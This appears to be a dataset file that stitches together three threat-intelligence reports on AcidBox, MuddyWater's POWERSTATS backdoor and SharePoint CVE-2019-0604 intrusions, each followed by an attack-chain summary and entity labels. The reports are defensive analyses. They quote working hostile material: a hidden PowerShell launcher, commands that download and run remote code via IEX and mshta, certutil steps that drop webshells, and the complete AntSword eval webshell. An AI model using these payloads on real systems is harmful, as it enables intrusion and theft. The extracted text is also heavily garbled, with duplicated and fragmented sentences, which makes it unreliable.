0xA0032B02;goto LABEL_45;}pBuffer = allocate_buffer(v13, (unsigned int)v3, 0i64, v11, 0, 1);buffer = pBuffer;20if ( !pBuffer )2122232425{LABEL_9:result = 0xA0032B04;goto LABEL_45;}url Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations26272829303132if ( memcpy_s(pBuffer, v3, a2, v3) ){LABEL_11:result = 0xA0032B06;goto LABEL_45;}…The main worker sample contains five icon resources with valid icons named 16, 256, 4097, 8193 and 12289. The names indicate different icon resolutions, but the icons only differ in the encrypted data appended to them which can be considered as a form of steganography. This data is encrypted with a custom algorithm and additionally zlib compressed. The same method is used within the SSP DLLs. A Python script for decryption and decompression can be found in the Appendix. After decryption, the data blob has the following structure:123456789struct data_blob {DWORD marker; // Marker bytes (0x9A65659A)DWORD crc32; // CRC32 value of decrypted or zlib uncompressedbytesDWORD size; // Size of decrypted or zlib uncompressed bytesDWORD option; // Information if data is encrypted or zlibcompressed; 0x1 = encrypted, 0x2 = zlib compressedchar data[]; // Encrypted or zlib compressed data};The decrypted data is as follows.Resource 16:12System\CurrentControlSet\Control\Class\{4D36E97D-E325-11CE-BFC1-08002BE10318}\0003\DriverDataResource 256:url Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations12System\CurrentControlSet\Control\Class\{4D36E96A-E325-11CE-BFC1-08002BE10318}\0000\DriverDataResources 16 and 256 are the Windows registry keys that contain the decryption key for the embedded driver in resource 8193 and additional payloads that are likely going to be injected by the AcidBox driver.Resource 4097:1 C:\WINDOWS\SYSTEM32\lsass.exeThis resource contains the path of the process each sample uses to verify it is being loaded into the correct process. Resource 8193 contains the unsigned kernelmode payload driver, which is also encrypted with RSA. The driver is realized as a kernelmode DLL with two indicator — caught our attention. This little known fact can be found in the export directory and can be helpful for attributing malware samples. All of the AcidBox samples contain gaps between the single exported function entries:Figure 4. Export directories of AcidBox samples with gaps between the export function entriesurl Rare Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsEvery AcidBox sample has a NumberOfFunctions value in the export directory that is bigger than the NumberOfNames value. This isn’t something unusual, as not every exported function has to have a name too. Unnamed functions can be also called by their ordinal values. What is uncommon, however, is that the function entries which are unnamed are also zeroed out, thus not used.This is the result when you use your own DEF file instead of __declspec(dllexport) to describe the attributes of your DLL file. When you use a DEF file, you can choose which ordinal your export function will have. This is not possible with __declspec(dllexport) as the Visual Studio compiler always counts your functions starting from one.Using a DEF file instead of __declspec(dllexport) has some advantages. You are able to export functions by ordinals and you can also redirect functions among other things. The disadvantage is that you have to maintain an additional file within your project.In the case of the AcidBox samples, we can conclude a couple of things. First, the author uses a DEF file, although he doesn’t make use of its advantages. This could indicate it’s a habit of the author to use DEF files. Second, the function ordinals seem to be chosen in steps of two integers. A possible explanation could be that the unused ordinals were once used for functions too. And last, if we assume the author really has chosen to make two integer steps, then in the usermode DLLs, one export function was removed. We can see that ordinal 3 is unused, leaving a bigger gap than one integer. All this information can be useful for malware attribution.ConclusionA new advanced malware, dubbed AcidBox, was used by an unknown threat actor in 2017 that went undetected until now. It uses a known VirtualBox exploit to disable Driver Signature Enforcement in Windows, but with a new twist: While it’s publicly known that VirtualBox driver VBoxDrv.sys v1.6.2 is vulnerable and used by Turla, this new malware uses the same exploit but with a slightly newer VirtualBox version.Sometimes, you are still able to find a technically interesting Windows malware that uses a new technique. This has become quite a rarity in today’s threat landscape where everything is either a copy of a copy of a copy or technically underwhelming. While AcidBox doesn’t use any fundamentally new methods, it breaks the myth that only VirtualBox VBoxDrv.sys 1.6.2 can be used for Turla’s exploit. Appending sensitive data as an overlay in icon resources, abusing the SSP interface for persistence and injection and payload storage in the Windows registry puts it into the category of interesting malware.The samples we dubbed AcidBox are only part of a bigger toolkit which we, unfortunately, could not identify. However, we provide two Yara rules for detection and threat hunting. Additionally, if you happen to find an additional sample, or are even infected, you can use the provided Python script to extract the sensitive data appended to the icon resources. All of these can be found here at Unit 42’s GitHub repository.url Rare Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsIf you have any further information about this threat, don’t hesitate to contact us.Palo Alto Networks customers are protected from this malware. Our threat prevention platform with WildFire identifies this malware as malicious. AutoFocus customers can investigate this activity with the tag AcidBox.We would like to thank Dr.Web, Kaspersky, ESET and hFireF0X for their collaboration.IOCs Files in Windows system32 directory msv1_1.dllpku.dllwindigest.dllMutexes Global\BFE_Event_{xxxxxxxxxxxx–xxxx-xxxxxxxx-xxxxxxxx}Global\{xxxxxxxxxxxx–xxxx-xxxxxxxx-xxxxxxxx}The malware takes the MachineGuid stored in the registry and reshuffles the single characters alternating from the end to the beginning and vice versa in steps of two. For example, the MachineGuid string a9982d3e-c859-4702-c761-df7eea468ade gets transferred into e9a86daeecf5–67c2-07419d87-e34289da and appended to the above templates.Windows Registry HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Class\{4D36E97D- E325-11CE-BFC1-08002BE10318}\0003\DriverData (REG_BINARY type)HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Class\{4D36E96A- E325-11CE-BFC1-08002BE10318}\0000\DriverData (REG_BINARY type)HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Class\{4D36E969- E325-11CE-BFC1-08002BE10318}\0000\DriverData (REG_BINARY type)Sample Hashes Statement.url "," 1. The loader DLL component is installed on the victim system, likely via phishing or exploitation. 2. The loader decrypts and loads the main worker DLL component into memory. 3. The main worker disables driver signature enforcement using the VirtualBox exploit. 4. The main worker decrypts and loads the kernel driver payload into the kernel. 5. The kernel driver provides persistent access and supports exfiltrating data from the victim system. 6. Additional components not analyzed may execute commands or install new modules. ",valid_80,"['DLL', 'the main worker', 'memory', 'Driver Signature Enforcement', 'us', 'The VirtualBox Exploit', 'the kernel', 'data', 'May', 'commands', 'modules']",DLL; the main worker; memory; Driver Signature Enforcement; us; The VirtualBox Exploit; the kernel; data; May; commands; modules.
"This website uses cookies to improve your experience.Accept AcceptRead More Read MoreBLOGBLOGA dive into MuddyWater APT targeting A dive into MuddyWater APT targeting Middle-East Middle-EastP O S T E D B Y 2 1A D M I N O N 02/ N O V /27MuddyWater is a threat actor that caught our attention for their extensive use of “Living off the Land” attacks in a targeted campaign aimed at the Middle East. During our investigation we reconstruct the evolution of the vectors used and how the group operates to target their victims, evade detections and move laterally inside the compromised infrastructures. MuddyWater Summary MuddyWater SummaryMuddyWater is an APT group that has been active throughout 2017, targeting victims in Middle Eastwith in-memory vectors leveraging on Powershell, in a family of attacks now identiﬁed as “Living off the  land”, as they don’t require the creation of new binaries on the victim’s machine, thus maintaining a low detection proﬁle and a low forensic footprint. MuddyWater has been assigned by PaloAlto in an article that describes how the actor’s POWERSTATS, evolved over the past year. For the sake of clarity we decided toThe name MuddyWater backdoor, called POWERSTATS maintain the same names.The operators behind MuddyWater are likely espionage motivated, we derive this information from the analysis of data and backdoors behaviors. We also ﬁnd that despite the strong preponderance of  victims from Pakistan, the most active targets appear to be in: Saudi Arabia the victims we identify a variety of entities with a stronger focus at Governments companies.Saudi Arabia, UAEUAE and IraqIraq. AmongstGovernments, TelcosTelcos and OilOilBy tracking the operations we ﬁnally ﬁgure out that the originating country is likely to be Iran, while it   remains harder to ascertain whether MuddyWater is state sponsored or a criminal organization incline to espionage.Finally we show how the threat evolved since its ﬁrst public report, the techniques used and how the  actors adapted to various public reports of their activities. Timeline TimelineIn order to understand how the threat evolved and to understand the whole picture, we have to reconstruct the timeline of the various discoveries and piece together the ﬁndings published.  18/Sep/2017 – First public report 18/Sep/2017 – First public reportTo the best of our knowledge the ﬁrst public report of this speciﬁc threat came from our intelligence   team (please let us know if any prior ﬁnding was published before) with the ﬁrst detection happening   during the second half of September. At that time the analysis from ReaQta-Hive shows the full threat’s GitHub to conceal and download its payload.Shortly after the information is made public, GitHub blocks the account and MuddyWater’s operators quickly shift to PastebinPastebin as their main repository.""Living off the land"" RAT downloads 1st stage from cloned fb/react repo, persists in registry & task, uses breached websites as c&c pic.twitter.com/hqwLmIKHXW — ReaQta (@ReaQta) September 18, 201726/Sep/2017 – First public analysis 26/Sep/2017 – First public analysisAt the end of September, MalwareBytes publishes an analysis of POWERSTATS, showing how the threat is now downloading its payload from Pastebin. With the exception of the repository location, we conﬁrm that the behavior of the analyzed backdoor is the same as the one identiﬁed by ReaQta a few   3/Oct/2017 – MuddyWater starts to embed the payload 3/Oct/2017 – MuddyWater starts to embed the payloadAs part of the evolution of POWERSTATS, for the ﬁrst time on the 3rd of October we notice that the  payload is not downloaded anymore from a remote source (GitHub or Pastebin) but it comes embedded 11/Nov/2017 – New C2 for the active backdoors ﬁrst public disclosure of the address).  14/Nov/2017 – Second public analysis date of the ﬁrst infection back to February 2017, while also showing how the operators adapted the  backdoor to reduce the detection rate and to thwart analyses. Palo Alto reports the C2 to be the same all the implants are already communicating with the C2 discovered on the 11th of November still communicating with the old C2 address from October. 20/Nov/2017 – New C2 and JScript RAT (Koadic) / Meterpreter 20/Nov/2017 – New C2 and JScript RAT (Koadic) / MeterpreterAfter the National CyberSecurity Center from Saudi Arabia publishes an advisory (the link appears to be unreachable from outside Middle East, but a copy can be found here) regarding the espionage OperationsMuddyWater operators use a series of compromised websites that act as proxies in order to conceal the real address of the C2 server. Infected endpoints connect randomly to one of the proxy servers, which in turn relays the information to the C2. Operators use the C2 to dispatch commands and receive exﬁltrated data. InfrastructureThe exception to the rule is represented by the Koadic part that bypasses the proxies and communicates directly with the C2 server.MuddyWater operators have been capable of consistently infecting new computers, this is clearly shown by the graph below showing the growth trend of victims when the group was still moving relatively under the radar, at least in Middle East.Daily trend of new infectionsAnother interesting part of the data is represented by the aggregate activity of each backdoor, show below.Overall activity of all infected victims (click to zoom)It is interesting to note what is the impact of public analyses and advisories on a large scale espionage campaign and how fast MuddyWater adapts to each new disclosure. It is also possible to understand the working patterns of the operators, at least up to the 12th of November when they were operatingrelatively undisturbed.Hourly activities (cilck to zoom)Zooming in on the victims, we can understand on which countries the group has been focusing with most infections in the EU belonging to victims travelling.Unique victims per country before the publication of advisories in Middle East, countries with less than 5 victims are not shown (Tunisia, Lebanon, Jordan, Israel, Egypt),At a ﬁrst glance Pakistan is the targeted country but our data reveals a different picture. By analyzing  the activity on each victim we realized that the operators were interested in a different area.Operators activities per countryPakistan is indeed the country with the most infections, though the operators appears to be relatively disinterested in those victims. On the other hand, Iraq has a large number of infections and the operators are extremely active on those infrastructures. Saudi Arabia and United Arab Emirates (Dubai speciﬁcally) have a low number of victims, all of them extremely active. This led us to believe that the  real targets are then: Iraq, Saudi Arabia and UAE. Targets TargetsVictims belong to a variety of different sectors but the MuddyWater operators are particularly active on Governments Telcos and OilOil companies (including one Oil platform). In one instance we found that a Governments, Telcos large Iraqi telecom provider was deeply compromised with 10% of their endpoints infected with POWERSTATS. The attackers also possess some decent capabilities of lateral movement and they rely on various exploits, LPE – fully working up to the latest version of Windows 10 – and tools (somepublicly available) to get access to the endpoints of interest once inside the infrastructure.Distribution of infected Operating SystemsWhile 85% of infected devices are workstations, the remaining 15% is made by servers, indicating that the attackers are capable of escalating after the initial breach to get direct access to the data they’re Decoy DocumentsThe initial backdoor is deployed using a decoy document containing a macro. Here are some examples of the content delivered to the victims:The observed content has some common characteristics like the attempt to impersonate National entities; the four documents mimics:Iraqi National Intelligence Service National Security Agency Ministry of Interior of Saudi Arabia Federal Investigation Agency Ministry Of Interior PakistanEvery document also presents an Input Box and a Button at the bottom of the page. Document Analysis Document AnalysisBeside the decoy content, the static analysis of the initial documents allowed us to identify some common characteristics. All documents leverages the Macro VBS mechanism to execute code and deploy next attack stages.SAMPLE 1 GIGABYTE AppVersion: 15.015.0 Software: Microsoft Ofﬁce Word  Microsoft Ofﬁce Word In particular all but one document’s metadata show that the author’s keyboard locale was set to ar_SA (Arabic, Saudi Arabia).The macro operations can be summarized as follow:Decode and drop a powershell script into C:\Users\Public\Documents\system.ps1 Decode and drop a VBS script into C:\Users\Public\Documents\system.vbs Executes the VBS with Shell.Open MethodThe VBS content is below reported and its scope is to simply run system.ps1system.ps1 powershell script.Set	objShell	=	WScript.CreateObject(""WScript.Shell"") command	=	""powershell.exe	-WindowStyle	hidden	-ExecutionPolicy	Bypass	-nologo	-noprofile	-file	C:\Users\Public\Documents\system.ps1"" objShell.Run	command,0 Set	objShell	=	NothingPowershell Backdoor Powershell Backdoorsystem.ps1 the attack-chain goes through two blocks of code that prepare the ground forStarting from system.ps1 the third block of code, containing the real powershell backdoor. Each block sets the variables necessary for the correct execution of the backdoor. Since the entire content is quite large we summarized the overall structure as follows:#	First	Block &((GEt-VARIAbLE	'*MDR*').nAme[3,11,2]-JOiN'')	(""	$(	sV	'Ofs'	'')""+[stRinG]((	100000,	[ ] #	Second	Block &(	$pShOme[21]+$psHOME[34]+'x')	([stRIng]::JOin(	''	,	('100000	[ ] #	Third	Block/Backdoor .	(	$ShELlID[1]+$shelLiD[13]+'x')	(	(	'1100110	[ ]We can observe 3 blocks of code that seems to be obfuscated with using Invoke-Obfuscation. Each block presents this structure:iex	|	(code)First Block First Block After the deobfuscation, the ﬁrst block sets the following variables: First Block VariablesSecond Block Second Block The second block like the ﬁrst one after being deobfuscated, creates additional local variables,  environment variables and functions used by the backdoor:Second Block VariablesSecond Block FunctionsThird Block/Backdoor Third Block/BackdoorThe third and ﬁnal block is the backdoor and it’s responsible for: Anti-Analysis Countermeasures Command ExecutionThe whole backdoor’s structure is quite simple simple and appears as follows:Third Block/BackdoorFor the sake of brevity we will report only the most interesting functions.The backdoor implements an anti-analysis countermeasure that uses isDebugEnv machine if one of the following tools is found to be running:isDebugEnv to shutdown theollydbg joeboxserverDuring the analysis, our victims received an updated version of isDebugEnv the following tools too:isDebugEnv which extends the list towin32_remote win64_remote64The function persistence persistence takes care of lowering the security settings of Microsoft Excel and Word, creating a survival on reboot mechanism and hiding the VBS and PS1 by setting the ﬁle attributes  System and Hidden via the Windows utility attrib.exe.(HKCU and HKLM) CurrentVersion\Run. The ﬁnal Windows Optimizations which resolves to: Wscript WscriptPersistence is obtained by adding an entry into (HKCU and HKLM) CurrentVersion\Run artifact will have a value named Windows Optimizations C:\Users\Public\Documents\System.Vbs C:\Users\Public\Documents\System.Vbs. An second persistence is obtained by adding a Scheduled Scheduled TaskTask entry called Microsoft\WindowsOptimizationsService C:\Users\Public\Documents\System.Vbs C:\Users\Public\Documents\System.Vbs.Microsoft\WindowsOptimizationsService which executes Wscript Wscriptfunction persist()The entire function and the system’s alterations can be easily summarized by checking the events in ReaQta-Hive:ReaQta-Hive EventsOn the next step the script looks for *.dat ﬁles, if none is found it sleeps up to one hour and then stores  the proxy URL in the registry and awaits until the function getKey()getKey() succeeds.getKey() function retrieves a key that uniquely identiﬁes the victim’s machine, if it does not exists it register function. Registration is performed by collecting information about the running OSThe getKey() invokes the register that will be sent to the attacker, the server will ﬁnally reply with a unique key (MD5) stored in  {username}.dat {username}.dat. By diving more in depth in the register User’s information, ﬁnally assembling the following string: register function we can see that it gathers IP, OS ad$($env:computername)~~$($env:username)~~$os~~$($ips.subString(1))~~$((Get-WmiObject	Win32_ComputerSystem).Domain)After the UniqueKey handling (Created or Found) stage the backdoor enters in the Main Loop that calls the getCommand() getCommand() function. This function requests commands to the C2 and sends back the results by splitting them in chucks. The command evaluation is performed by using Invoke-Expression Invoke-Expression from powershell, such approach is simple and straightforward and it offers strong post-exploitation capabilities to the attacker, the scripts can now run as a remote powershell.Additional persistence method Additional persistence methodWe identiﬁed an additional persistence method deployed by the attacker, the technique relies on using  a Word Template and it’s been described at length in the article “Maintaining Access with Normal.dotm”Powershell script that create the Normal.dotm ﬁle Macro from Normal.dotmConnections and Similarities between samples Connections and Similarities between samplesDuring the investigation we noticed that this attack generated an incident quite similar to another one we already observed in the past. As we can see from the following screenshots the two process-tree are almost the same:Behavioral-Tree view of Old and New incidentsThe core differences between the two attacks can be summarized as follows:Macro and Powershell script are now obfuscated Backdoor code has been refactored URL parameters are changedAdditionally the code of the backdoor has been refactored, as it can be seen from the following examples.function httpGet The new version adds a fallback URL to contact, in both cases domains are randomly chosen from an hard-coded list.httpGet diffThe “send” code has been moved into a dedicated new function:send code difffunction persistenceThe persistence is obtained by using the same techniques and names as before, with the exception ofthe scheduled-task entry name that changes as follows:WindowsOptimizations	->	Microsoft\WindowsOptimizationsServiceCurrentVersion\Run CurrentVersion\Run PersistenceDifferences between Old and New CurrentVersion\RunScheduled Task Scheduled Task PersistenceDifferences between Old and New Scheduled TaskMuddyWater Communication MuddyWater CommunicationCommunication with the C2 happens through compromised websites working as proxies, as explained above. Here it is a partial list of the proxies adopted by the backdoor:Proxy ListAs it can be seen from the above image, every request is performed via GET:url’s interactions with the attacker can be synthesized in two main steps:UniqueKey Handling (Registration/UniqueKey Update) Command ExchangeRegistration (already explained in depth) uses the following URL parameters:Base64(CustomEncoding(a=r&b=[REGISTRATION_DETAILS]))The ﬁnal result from a network point of view is: registrationCommand Exchange happens through the function getCommand getCommand.The Backdoors can request a command to the attacker using the $id which is the UniqueKey:Base64(CustomEncoding(a=g&b=$id))The attacker replies as follows:Base64(CustomEncoding($cmdID~~$cmd))Once the backdoor executes the command $cmd, it replies back to the attacker with the result:Base64(CustomEncoding(a=s&i=$id&ch=last&ci=$cmdId&r=$result))Depending on the length of the result, the reply to the attacker can be divided in chunks.This is an extract of commands received directly from the attacker:781~~Remove-itemproperty	-path	HKCU:\Software\Classes\exefile\shell\runas\command	-name	IsolatedCommand	-Force791~~powershell	-nop	-w	hidden	-exec	bypass	-c	""IEX	(New-Object	Net.WebClient).DownloadString('url""As we can see from the last command, the attacker sent a new powershell script:powershell script sh.txtWhose scope was to update the backdoor:New C2 address New isDebugEnv function New proxy list (reported below)Old vs New Proxy ListIn another session we received other commands whose scope was to try other backdoors:Koadic JScript RAT:821~~mshta	url~~whoamiKoadic JScript RAT:826~~mshta	url injected using to_mem_pshreﬂection.ps1.template 829~~powershell.exe	-nop	-w	hidden	-e	aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAk[ ]Koadic JScript RAT:836~~mshta	url Attribution MuddyWater AttributionAs usual attribution of cyber espionage operations is a very complex topic and we don’t have deﬁnitive  elements to make conclusions, that said during our investigation we noticed what might have been a mistake from one of the operators and for a while we were able to track his/her movements. The IP address was in Tehran, Iran and we have reason to believe that, in that speciﬁc instance, we were  dealing with a ﬁnal IP address and not a proxy, or a victim used to conceal the real address. Other  elements provide circumstantial evidence that the attacks can reasonably originate from Iran like the kind (and more speciﬁcally the identities) of the victims most investigated by the operators and their  geographic distribution.Despite the origin of MuddWater’s attacks, a lot of doubts remain, the ﬁrst of them is whether the group  is state-sponsored or part of the organized crime. The relatively low sophistication of the attacks and the general handling of their infrastructure led us to think about a criminal group, but the choice of victims and their agility once inside the compromised infrastructures made us think about a more structured entity (possibly made by two different groups, one for attacks and another one specialized in post-exploitation activities). The second is about their link with APT33/OilRig similarities in the techniques adopted by MuddyWater and APT33/OilRig but whether the operations belong to the same actor is still unknown. Conclusions ConclusionsAPT33/OilRig, there are differentOur customers running ReaQta-Hive are already protected and no further action is required. We suggest to check for all the published IOCs in order to understand whether the current backdoors are active and to check for signs of persistence described above. url url url url url KoadicPowerstats and vbs launcher hashes Powerstats Proxy URLsurl url url url urlﬁfteen/logs[.]php?c=  url url url url url url[.]com/404[.]php?c=  url url url url url url url url url urlﬁfa[.]com/wp-content/themes/Newspaper/mobile/includes/404[.]php?c=  urlﬁfa[.]com/wp-content/themes/Newspaper/mobile/work[.]php?c=  url url url url url urlﬁfteen/work[.]php?c=  urlﬁg[.]php?c=  url url urlﬁce/lib/work[.]php?c=  url url url urlﬁle/sym/work[.]php?c=  url url url url url urlﬁles/articles/css[.]aspx?c= urlﬁles/articles/large/css[.]aspx?c=  url url url url url url url url urlﬁeld[.]com/v2/work[.]php?c=  url url url url url url url url url url url urlﬁfteen/logs[.]php?c=  url url url url Bypass scripts uac.ps1Normal.dotm powershell script Persistence ArtifactsHKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run – Key “WindowsHKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run – Key: “WindowsRegistry – HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run Optimizations” – Value “wscript [maliciuous].vbs” Registry – HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run Optimizations” – Value:“wscript [maliciuous].vbs” Scheduled Task – Name: Microsoft\WindowsOptimizationsService – Action: “wscript [maliciuous].vbs” Word Template – Path: c:\users\{user}\AppData\Roaming\Microsoft\Templates\Normal.dotm ,powerstats rat saudi arabia uae,,, APT iraq jscript koadic living off the land meterpreter Middle East muddywater pakistan powershell,,,,,,,, ,PAGESBlogContact UsPartnersProductsReaQta-HiveRECENT POSTSA dive into MuddyWater APT targeting Middle-EastA short journey into DarkVNC attack chainLocky Dropper Now Comes Embedded in the LoaderCopyright ReaQta 2017Blog ProductsJoin Us Contact Us Privacy Policy ","1. MuddyWater sends phishing emails with macro-enabled Office documents to victims. The documents use branding and logos of organizations the target would trust. 2. If the victim enables macros, a PowerShell script is dropped onto the system. 3. The PowerShell script executes and installs the POWERSTATS backdoor. 4. POWERSTATS connects back to C2 servers controlled by MuddyWater. 5. The attackers use the C2 channel to send commands and additional scripts to the backdoor for further reconnaissance and data exfiltration. 6. MuddyWater continually sets up new infrastructure and modifies their backdoor to avoid detection. ",valid_4,"['MuddyWater', 'Macro', ' victims', 'us', 'the target', 'the victim', 'a PowerShell script', 'the system', 'POWERSTATS', 'servers', 'the attackers', 'the C2', 'commands', 'the backdoor', 'RAT', 'detection']",MuddyWater; Macro;  victims; us; the target; the victim; a PowerShell script; the system; POWERSTATS; servers; the attackers; the C2; commands; the backdoor; RAT; detection.
"2/4/2020Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsActors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizationsunit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerabilityBy Robert FalconeFebruary 3, 2020Executive Summary On September 10, 2019, we observed unknown threat actors exploiting a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell freely available on Github, which is remarkably similar to the infamous China Chopper webshell.On January 10, 2020, we used Shodan to search for Internet accessible servers running versions of SharePoint vulnerable to CVE-2019-0604. While admittedly the version numbers provided by SharePoint within HTTP responses do not always provide the precise SharePoint version number, we decided to use it to check if it was less than the version numbers of the patched SharePoint versions from the Microsoft advisory. We performed this comparison and found 28,881 servers that advertised a vulnerable version of SharePoint. We did not actively check each server to verify if they were indeed vulnerable, so it is possible that many of these public- facing SharePoint servers were not vulnerable or since patched. Regardless, the sheer number of servers and publicly available exploit code suggests that CVE-2019-0604 is still a major attack vector.Using this collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket’s atexec tool to use dumped credentials to run commands on other systems. On September 19, 2019, we observed the same exact Mimikatz variant uploaded to a webshell hosted at another governmenturl Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizationsorganization in a second country in the Middle East. The Mimikatz variant uploaded to these two organizations is unique, as it involves a seemingly custom loader application written in .NET. Therefore, we believe that the same threat group is behind both intrusions.Back in April 2019, we ﬁrst observed the Emissary Panda threat group exploiting CVE-2019-0604 to install webshells on SharePoint servers at government organizations in two Middle Eastern countries. Fast forward ﬁve months to the current attacks and we see exploitation of the same vulnerability at government organizations in two different countries compared to the April attacks. We do not have any strong ties to connect the current attacks exploiting this vulnerability in SharePoint with the Emissary Panda attacks carried out in April. The overlaps between these two sets of attacks include exploitation of a common vulnerability, similar toolset and a shared government victimology, but no strong pivot points to connect these attack campaigns together.The exploitation of this vulnerability is not unique to Emissary Panda, as multiple threat groups are using this vulnerability to exploit SharePoint servers to gain initial access to targeted networks. We would like to acknowledge the possibility of an overlap in the AntSword webshell, as we stated that Emissary Panda used China Chopper in the April attacks and AntSword and China Chopper webshells are incredibly similar. However, at this time we do not believe the April attacks used AntSword based on artifacts analyzed on the SharePoint server, speciﬁcally none of the IIS logs in the April attacks used the AntSword User-Agent in requests to the webshell that were observed in the current attacks.Palo Alto Networks customers are protected from the threat described in this blog through Threat Prevention signatures for the exploits and C2 trafﬁc as well as through WildFire. More details on this protection is available in the conclusion of the report. Exploiting CVE-2019-0604 On September 10, 2019, we observed an HTTP POST request to the following URL that we believe was the exploitation of CVE-2019-0604 in a publicly facing SharePoint server (T1190):/_layouts/15/picker.aspxWe did not have access to the data sent within the HTTP POST request above, however, we observed the following command executed on the SharePoint server at the time of the inbound request:C:\Windows\System32\cmd.exe /c echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPg[ snip ] > c:\programdata\cmd.txt & certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server Extensions\14\TEMPLATE\LAYOUTS\c.aspx & certutil - decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\c.aspx & certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\c.aspxThe command above uses the echo command to write a large chunk of base64 encoded data to a text ﬁle named cmd.txt. The command then uses the certutil application to convert the base64 encoded data (T1132) in the cmd.txt ﬁle to c.aspx in three different SharePoint related folders.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsThe result of this entire command saves a variant of the Awen asp.net webshell (T1100) to the SharePoint server to further interact with the compromise server. The Awen webshell deployed in the exploitation of this SharePoint vulnerability had a SHA256 hash of Actor’s Awen Webshell Just 40 seconds after the suspected exploitation of CVE-2019-0604, we observed the ﬁrst HTTP GET request to a webshell at c.aspx, which is a modiﬁed version of the freely available awen asp.net webshell. We believe this HTTP GET request was the actor visiting the webshell after exploitation and prior to executing commands. Figure 1 shows the Awen webshell, which has little functionality outside of setting the path to the command prompt application and running commands.Figure 1 Awen webshell installed by actor after exploiting CVE-2019-0604The actor uses the Awen webshell seen in Figure 1 to run various commands to do an initial discovery on the system and network, including user accounts (T1033 and T1087), ﬁles and folders (T1083), privileged groups (T1069), remote systems (T1018) and network conﬁguration (T1016). Table 1 not only shows the commands used for discovery, but also the commands used to deploy another webshell to the server using the echo command to write base64 encoded data to a.txt and using the certutil application to decode and save to bitreeview.aspx. Table 1 also shows the time delta between the commands executed using the Awen webshell to provide insight into the tempo at which this actor executed commands.Time delta from 3 minutes 55 sec‐ onds (from initial exploitation) 14 secondsCommanddir c:\programdata\query userurl Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations15 seconds 10 minutes 53 5 seconds23 secondsnet group /do whoami net user <redacted hostname> /do net localgroup administrators net group exchange servers /do ipconﬁg /all ping -n 1 -a 10.x.x.x echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQi[ snip ] > c:\programdata\a.txt type c:\programdata\a.txt certutil -decode c:\programdata\a.txt c:\program ﬁles\common ﬁles\microsoft shared\web server extensions\14\template\layouts\bitreeview.aspx del c:\programdata\a.txtTable 1 Awen webshell installed by actor after exploiting CVE-2019-0604The webshell named bitreeview.aspx was saved to a folder within the SharePoint server’s install path. The bitreeview.aspx ﬁle is a variant of the AntSword webshell that has undeniably similar traits as the infamous China Chopper webshell. After installing this AntSword webshell, the actor no longer uses the Awen webshell and issues the ﬁrst command to AntSword 35 seconds after the last command issued to the Awen webshell. Actor’s AntSword Webshell AntSword is a modular webshell that involves a very simple webshell that the actor would deploy to the compromised server and a client application referred to as the AntSword Shell Manager. The use of the client application differs from many other webshells that the actor would interact with in a browser window. The actor would use the AntSword Shell Manager to interact with the AntSword webshell on the compromised server, as the Shell Manager sends the appropriate script to the webshell that will execute to carry out the desired action. To provide a sense of the limited functionality within the webshell itself, the bitreeview.aspx AntSword webshell deployed in this attack (SHA256: bytes and contained the following:url Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations%@ Page Language=""Jscript""% % eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert. FromBase64String(Request.Item[""Darr1R1ng""])),""unsafe""); %1 7As you can see from the code above, the AntSword webshell has no functionality other than running a script provided by the AntSword Shell Manager, speciﬁcally within a ﬁeld named Darr1R1ng of an HTTP POST request. The code above also tells us the actors had created their own custom “encoder” within the AntSword Shell Manager to be able to interact with the code above, which we will discuss in detail in the next section.The actors used the AntSword webshell to run a variety of commands on the compromised server. The following are a list of the initial commands issued using this webshell that will attempt to do initial system and user discovery, as well as attempt to ping systems of interest:1. whoami 2. query user 3. nltest /domain_Trusts 4. ping -n 1 <redacted domain name> 5. ipconﬁg /all 6. net group /do 7. net group Exchange Servers /do 8. ing -n 1 <redacted hostname of Exchange server> 9. ping -n 1 <redacted hostname of Exchange server> 10. query userThe ping attempts suggests that this actor seeks to gain access to Microsoft Exchange servers, which may be part of their objective or they desire the elevated privileges on the domain that an Exchange server provides. Also, the ping attempts show the actor misspelled the command their ﬁrst attempt, which suggests that these commands were issued with hands on-keyboard and not through an automated script. Figure 2 shows the terminal interface within the AntSword Shell Manager application through which the actors would have issued commands.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsFigure 2 Terminal within AntSword’s Shell Manager interacting with webshellWhile we did not have 100% visibility, we also believe the actors used the AntSword webshell to upload tools to the server as well, speciﬁcally cURL, a custom Mimikatz variant, and compiled variants of Impacket’s wmiexec and atexec tools. AntSword has a FileManager interface that provides a navigation capability similar to Windows Explorer, which allows the actor to upload and download ﬁles to and from the compromised server. Figure 3 shows the FileManager interface within the AntSword Shell Manager application.url Still Exploiting SharePoint Vulnerability to Attack Middle East Government OrganizationsFigure 